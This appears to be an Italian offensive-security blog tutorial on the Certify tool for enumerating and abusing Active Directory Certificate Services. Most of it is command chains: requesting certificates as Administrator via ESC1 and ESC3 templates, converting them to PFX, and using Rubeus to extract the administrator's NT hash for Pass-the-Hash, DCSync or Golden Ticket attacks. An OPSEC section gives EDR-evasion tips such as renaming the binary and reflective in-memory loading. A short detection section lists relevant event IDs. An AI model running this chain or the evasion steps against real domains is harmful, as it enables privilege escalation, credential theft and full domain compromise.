---
title: 'Certify: Enumerazione e Abuso di AD CS da Windows con C#'
slug: certify
description: >-
  Certify è il tool C# di GhostPack per enumerare e sfruttare AD CS da Windows
  senza dipendenze Python. Scopri come usarlo per trovare template vulnerabili e
  richiedere certificati per l'escalation a Domain Admin.
image: /certify-ad-cs.webp
draft: false
date: 2026-06-03T00:00:00.000Z
categories:
  - tools
subcategories:
  - expoit
tags:
  - certificate-services
  - certificate-abuse
---

# Certify: AD CS Enumeration e Abuse da Windows

**In sintesi:** Certify è un tool C# sviluppato da harmj0y e tifkin\_ di SpecterOps come parte del progetto GhostPack. Enumera e sfrutta misconfigurazioni in [AD CS](https://hackita.it/articoli/adcs-esc1-esc16/) direttamente da Windows, senza dipendenze Python. È il complemento Windows-native di [Certipy](https://hackita.it/articoli/certipy/) — utile quando non hai un foothold Linux ma hai una shell su una macchina Windows joinata al dominio.

***

Rilasciato a Black Hat 2021 insieme alla ricerca "Certified Pre-Owned", Certify automatizza la discovery delle misconfigurazioni ESC via LDAP e permette di richiedere certificati direttamente dall'endpoint del CA via DCOM/RPC. Non richiede privilegi elevati per l'enumerazione — qualsiasi account di dominio è sufficiente.

> **Key Takeaway:** SpecterOps non distribuisce binari precompilati di Certify — va compilato dal sorgente. In alternativa esistono build compilate non ufficiali su repo come Ghostpack-CompiledBinaries, ma usale con cautela in ambienti reali.

***

## Cheat Sheet — Comandi Principali

| Obiettivo                       | Comando                                                                                                                                    |
| ------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------ |
| Trova template vulnerabili      | `.\Certify.exe find /vulnerable`                                                                                                           |
| Trova tutti i template          | `.\Certify.exe find`                                                                                                                       |
| Info Certificate Authority      | `.\Certify.exe cas`                                                                                                                        |
| Lista template pubblicati       | `.\Certify.exe list`                                                                                                                       |
| Lista template per CA specifica | `.\Certify.exe list /ca:CA01.corp.local\CORP-CA`                                                                                           |
| ESC1 — richiedi cert come admin | `.\Certify.exe request /ca:CA01.corp.local\CORP-CA /template:VulnTemplate /altname:administrator`                                          |
| ESC3 — agent certificate        | `.\Certify.exe request /ca:CA01.corp.local\CORP-CA /template:EnrollmentAgentTemplate`                                                      |
| ESC3 — on-behalf-of             | `.\Certify.exe request /ca:CA01.corp.local\CORP-CA /template:User /onbehalfof:corp\administrator /enrollcert:agent.pfx /enrollcertpw:Pass` |
| Con credenziali alternative     | `.\Certify.exe find /vulnerable /username:attacker /password:Pass /domain:corp.local`                                                      |
| Dominio specifico               | `.\Certify.exe find /vulnerable /domain:corp.local`                                                                                        |
| Converti PEM → PFX (openssl)    | `openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx -passout pass:Pass123`     |
| Rubeus auth → NT hash           | `Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /password:Pass123 /domain:corp.local /dc:<DC> /getcredentials /show /ptt`     |
| Download certificato pending    | `.\Certify.exe download /ca:CA01.corp.local\CORP-CA /id:42`                                                                                |

***

```powershell
# Clona il repo
git clone https://github.com/GhostPack/Certify

# Apri Certify.sln con Visual Studio 2022
# Build → Release → Certify.exe

# In-memory via PowerShell (evita il drop su disco)
$bytes = [IO.File]::ReadAllBytes("C:\temp\Certify.exe")
$b64 = [Convert]::ToBase64String($bytes)
# Poi carica via Invoke-ReflectivePEInjection o simile
```

***

## Enumerazione

### Sintassi originale (più documentata)

```powershell
# Trova tutti i template e CA — output completo
.\Certify.exe find

# Solo template vulnerabili (ESC1-ESC8)
.\Certify.exe find /vulnerable

# Con credenziali alternative
.\Certify.exe find /vulnerable /username:utente /password:Password123!

# Filtra per dominio specifico
.\Certify.exe find /vulnerable /domain:corp.local

# Info sulle Certificate Authority
.\Certify.exe cas

# Lista i template disponibili
.\Certify.exe list

# Lista template per CA specifica
.\Certify.exe list /ca:CA01.corp.local\CORP-CA
```

### Sintassi aggiornata (versioni recenti)

```powershell
# Enumera tutti i template
.\Certify.exe enum-templates

# Solo template pubblicati e vulnerabili
.\Certify.exe enum-templates --filter-enabled --filter-vulnerable

# Solo template con Client Authentication EKU
.\Certify.exe enum-templates --filter-client-auth

# Solo template che permettono Enrollee Supplies Subject
.\Certify.exe enum-templates --filter-enrollee-supplies-subject

# Enumera le CA
.\Certify.exe enum-cas

# Specifica LDAP server target
.\Certify.exe enum-templates --filter-vulnerable --ldap-server DC01.corp.local
```

***

## Richiesta Certificati

### ESC1 — SAN controllato dall'utente

```powershell
# Richiedi certificato come Administrator dal template vulnerabile
.\Certify.exe request /ca:CA01.corp.local\CORP-CA /template:VulnerableTemplate /altname:administrator

# Output: certificato in formato PEM (cert + private key concatenati)
# Salvato come cert.pem nella directory corrente
```

### ESC3 — Enrollment Agent

```powershell
# Step 1 — ottieni un agent certificate
.\Certify.exe request /ca:CA01.corp.local\CORP-CA /template:EnrollmentAgentTemplate

# Step 2 — usa l'agent cert per richiedere cert on-behalf-of Administrator
.\Certify.exe request /ca:CA01.corp.local\CORP-CA /template:User \
  /onbehalfof:corp\administrator /enrollcert:agent.pfx /enrollcertpw:Password123!
```

### Credenziali alternative

```powershell
# Richiedi con account diverso da quello corrente
.\Certify.exe request /ca:CA01.corp.local\CORP-CA /template:VulnerableTemplate \
  /altname:administrator /username:attacker /password:Password123!
```

***

## Conversione e Autenticazione

Certify restituisce il certificato in formato PEM — va convertito in PFX per usarlo con [Rubeus](https://hackita.it/articoli/rubeus/) o altri tool.

### Conversione da PEM a PFX

```powershell
# Con openssl (da Kali o WSL)
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" \
  -export -out cert.pfx

# Specifica password per il PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" \
  -export -out cert.pfx -passout pass:Password123!
```

### Autenticazione con Rubeus

```powershell
# Ottieni TGT + NT hash dal certificato
Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /password:Password123! \
  /domain:corp.local /dc:<DC_IP> /getcredentials /show /ptt

# Output:
# [*] Getting credentials using U2U
# [*]   EncryptionType  : rc4_hmac
# [*]   Hash            : <NT_HASH>
```

Con l'NT hash puoi procedere con Pass-the-Hash, [DCSync](https://hackita.it/articoli/dcsync/), o forgiare un [Golden Ticket](https://hackita.it/articoli/golden-ticket/).

***

## Download Certificati Emessi

```powershell
# Scarica un certificato già emesso dalla CA tramite Request ID
.\Certify.exe download /ca:CA01.corp.local\CORP-CA /id:42
```

Utile quando una richiesta è in stato pending (Manager Approval abilitato) e viene approvata in seguito.

***

## Certify vs Certipy

|                         | Certify          | Certipy                  |
| ----------------------- | ---------------- | ------------------------ |
| Linguaggio              | C#               | Python                   |
| Piattaforma             | Windows only     | Linux / Windows          |
| Dipendenze              | .NET 4.7.2       | Python + pip             |
| Binari precompilati     | Non ufficiali    | `pip install certipy-ad` |
| Autenticazione con cert | No (usa Rubeus)  | Sì (`certipy auth`)      |
| ESC coverage            | ESC1-ESC8 (base) | ESC1-ESC16 (completa)    |
| NTLM Relay              | No               | Sì (`certipy relay`)     |
| Shadow Credentials      | No               | Sì (`certipy shadow`)    |
| Golden Certificate      | No               | Sì (`certipy forge`)     |

**Quando usare Certify:** hai una shell Windows, non puoi caricare Python, o preferisci un binario C# nativo. Per la fase di enumerazione e richiesta certificati è equivalente a Certipy. Per tutto il resto (auth, relay, forge) hai bisogno di tool aggiuntivi.

***

## OPSEC

* Certify non scrive file su disco durante l'enumerazione — tutto l'output va su stdout
* La richiesta del certificato (`request`) genera **Event ID 4886/4887** sul CA — inevitabile
* Il nome del processo `Certify.exe` è ovvio per qualsiasi EDR — rinominalo prima di eseguirlo
* Caricarlo in memoria via PowerShell reflective injection evita il drop su disco
* Usa `/username` e `/password` per autenticarti con credenziali diverse dall'account corrente senza cambiare il contesto di sessione

***

## Scenario Reale

Hai una shell PowerShell su `WORKSTATION01` con un account utente normale. Vuoi verificare se AD CS ha template sfruttabili.

```powershell
# 1. Carica Certify e cerca template vulnerabili
.\Certify.exe find /vulnerable

# Output: template "CorpUser" → ESC1
# Enrollee: Authenticated Users, CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT: True

# 2. Richiedi cert come Administrator
.\Certify.exe request /ca:CA01.corp.local\CORP-CA \
  /template:CorpUser /altname:administrator
# → cert.pem

# 3. Converti in PFX (da Linux/WSL)
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" \
  -export -out admin.pfx -passout pass:Hacked123!

# 4. Autentica con Rubeus → NT hash
Rubeus.exe asktgt /user:administrator /certificate:admin.pfx /password:Hacked123! \
  /domain:corp.local /dc:<DC_IP> /getcredentials /show /ptt
```

***

## Detection

**🔴 HIGH:**

* **Event ID 4886** — richiesta certificato con SAN diverso dall'account autenticato
* **Event ID 4887** — certificato emesso con SAN anomalo

**🟡 MEDIUM:**

* Processo con nome `Certify.exe` o varianti su endpoint (rilevato da EDR)
* Burst di query LDAP verso il DC da un singolo host in breve tempo

***

## FAQ

**Certify funziona anche da macchine non joined al dominio?**
Sì, con il flag `/username` e `/password` per autenticarsi esplicitamente. Ma richiede raggiungibilità del DC su porta 389 (LDAP) e del CA su DCOM/RPC per la richiesta.

**Perché SpecterOps non distribuisce binari precompilati?**
Scelta deliberata per limitare l'abuso immediato. I binari non ufficiali circolano comunque — la decisione ha un impatto limitato sulla sicurezza reale ma mantiene una postura responsabile.

**Certify supporta ESC9-ESC16?**
Non completamente. Copre ESC1-ESC8 nella maggior parte delle versioni disponibili. Per ESC9-ESC16 usa [Certipy](https://hackita.it/articoli/certipy/).

***

## Conclusione

Certify rimane lo strumento di riferimento per l'enumerazione AD CS in contesti dove hai solo una shell Windows e non puoi caricare Python. Il suo output — chiaro, strutturato, e diretto — rende immediata l'identificazione dei template sfruttabili. Per l'exploitation completa, soprattutto su ESC8 e oltre, la catena Certify + Rubeus è la combinazione più comune in ambienti Windows-only.

***

**Risorse:**

* [GhostPack/Certify GitHub](https://github.com/GhostPack/Certify)
* [SpecterOps – Certified Pre-Owned](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
